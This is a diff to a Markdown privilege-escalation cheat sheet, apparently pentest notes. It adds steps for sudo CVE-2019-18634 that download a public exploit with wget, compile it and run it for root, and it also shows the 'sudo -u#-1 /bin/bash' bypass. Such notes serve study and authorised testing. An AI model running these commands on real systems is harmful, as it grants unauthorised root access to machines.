@@ -177,9 +177,24 @@
   ```bash
   sudo -u#-1 /bin/bash
   ```
-  4 ROOT!
+  4. ROOT!
   
-###
+### CVE-2019-18634
+  1. Check version of sudo for version before 1.8.26
+  2. Get the POC into the machine
+  ```bash
+  wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c -O exploit.c
+  ```
+  3. Compile exploit.c
+  ```bash
+  gcc -o exploit exploit.c
+  ```
+  4. Run the exploit
+  ```bash
+  ./exploit
+  ```
+  5. ROOT!
+  
 ## Escalation via SUID
 ## Escalation via Scheduled Tasks
 ### Check writeable Files and Directories
